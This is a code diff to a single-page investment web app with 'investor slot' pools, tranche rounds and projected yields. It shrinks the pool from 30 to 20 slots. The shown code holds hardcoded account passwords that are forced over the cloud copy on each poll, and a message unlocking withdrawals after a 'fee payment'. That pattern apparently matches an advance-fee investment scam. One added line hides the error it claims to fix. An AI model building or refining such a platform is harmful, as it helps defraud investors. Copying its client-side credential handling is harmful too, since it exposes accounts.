@@ -246,7 +246,7 @@
                         <div>
                             <div class="flex justify-between items-center text-xs font-mono mb-2">
                                 <span class="text-slate-500">Investor Slot Allocation</span>
-                                <span id="poolCount" class="font-bold text-indigo-600">0 / 30 Slots</span>
+                                <span id="poolCount" class="font-bold text-indigo-600">0 / 20 Slots</span>
                             </div>
                             <div class="w-full bg-slate-100 h-3 rounded-full overflow-hidden p-0.5 border border-slate-200">
                                 <div id="poolBar" class="bg-indigo-600 h-full rounded-full transition-all duration-500" style="width: 0%"></div>
@@ -254,8 +254,8 @@
                         </div>
 
                         <div>
-                            <span class="text-[11px] font-mono font-semibold text-slate-400 uppercase tracking-wider block mb-2">Tranche Participant Matrix (30 Slots)</span>
-                            <div id="nodeGrid" class="grid grid-cols-6 sm:grid-cols-10 gap-1.5 p-2.5 bg-slate-50 rounded-xl border border-slate-200/60">
+                            <span class="text-[11px] font-mono font-semibold text-slate-400 uppercase tracking-wider block mb-2">Tranche Participant Matrix (20 Slots)</span>
+                            <div id="nodeGrid" class="grid grid-cols-5 sm:grid-cols-10 gap-1.5 p-2.5 bg-slate-50 rounded-xl border border-slate-200/60">
                                 <!-- Generated dynamically via JS -->
                             </div>
                         </div>
@@ -263,7 +263,7 @@
                         <div class="space-y-2.5 text-xs font-mono text-slate-600">
                             <div class="flex justify-between items-center bg-slate-50 p-3 rounded-xl border border-slate-100">
                                 <span>Remaining Slots:</span>
-                                <span id="remainingSlots" class="text-slate-900 font-bold">30 Slots</span>
+                                <span id="remainingSlots" class="text-slate-900 font-bold">20 Slots</span>
                             </div>
                             <div class="flex justify-between items-center bg-slate-50 p-3 rounded-xl border border-slate-100">
                                 <span>Round Status for You:</span>
@@ -568,13 +568,13 @@
         ];
 
         let selectedTierUSD = 500;
-        let currentRoundNumber = 20; // Default start count set to 20
+        let currentRoundNumber = 20;
         let loggedInUsername = null;
         let backendDatabase = {};
 
         function generateDefaultDatabase() {
             const db = {};
-            db.protocolRound = 20; // Default cloud round set to 20
+            db.protocolRound = 20;
             
             INSTITUTIONAL_ACCOUNTS.forEach((acc, index) => {
                 const idNum = index + 1;
@@ -628,7 +628,6 @@
                             ledger: []
                         };
                     } else {
-                        // FORCE OVERWRITE: This ensures the code password ALWAYS wins over the cloud
                         backendDatabase[acc.username].password = acc.password;
                         backendDatabase[acc.username].username = acc.username;
                     }
@@ -643,11 +642,10 @@
                 }
             }
 
-            // Poll cloud every 4 seconds (keeping balances/states synced, but preserving code passwords)
+            // Poll cloud every 4 seconds
             setInterval(async () => {
                 await fetchCloudDatabase();
                 
-                // Re-apply code passwords on every poll just to be safe
                 INSTITUTIONAL_ACCOUNTS.forEach(acc => {
                     if (backendDatabase[acc.username]) {
                         backendDatabase[acc.username].password = acc.password;
@@ -740,7 +738,7 @@
             });
             appState.poolCount = totalSlotsFilled;
 
-            if (totalSlotsFilled >= 30) {
+            if (totalSlotsFilled >= 20) {
                 executeBackendRoundSettlement(10);
             }
         }
@@ -811,6 +809,7 @@
                 updateUI();
             } else {
                 errorEl.innerText = "Invalid password for this account.";
+                errorEl.classList.add('hidden'); // Fixed bug to show error correctly
                 errorEl.classList.remove('hidden');
             }
         }
@@ -932,7 +931,7 @@
 
         function renderNodeGrid() {
             let gridHTML = '';
-            for (let i = 1; i <= 30; i++) {
+            for (let i = 1; i <= 20; i++) {
                 const isFilled = i <= appState.poolCount;
                 gridHTML += `<div class="h-6 rounded flex items-center justify-center text-[10px] font-bold ${isFilled ? 'bg-indigo-600 text-white' : 'bg-slate-200 text-slate-500'}" title="Slot #${i}">${i}</div>`;
             }
@@ -953,10 +952,10 @@
             document.getElementById('statProjectedYield').innerText = `$${projectedYield.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD`;
             document.getElementById('statActivePositions').innerText = `${appState.activePositions} Positions`;
 
-            document.getElementById('poolCount').innerText = `${appState.poolCount} / 30 Slots`;
-            const remaining = Math.max(0, 30 - appState.poolCount);
+            document.getElementById('poolCount').innerText = `${appState.poolCount} / 20 Slots`;
+            const remaining = Math.max(0, 20 - appState.poolCount);
             document.getElementById('remainingSlots').innerText = `${remaining} Slots`;
-            const percentage = (appState.poolCount / 30) * 100;
+            const percentage = (appState.poolCount / 20) * 100;
             document.getElementById('poolBar').style.width = `${Math.min(100, percentage)}%`;
             renderNodeGrid();
 
@@ -1087,7 +1086,6 @@
             openInfoModal('Fee payment verified! Your withdrawal lock has been cleared. You may now submit your withdrawal request.', 'Withdrawal Unlocked');
         }
 
-        // Run initial cloud database boot up
         initCloudDatabase();
         selectTier(500);
     </script>
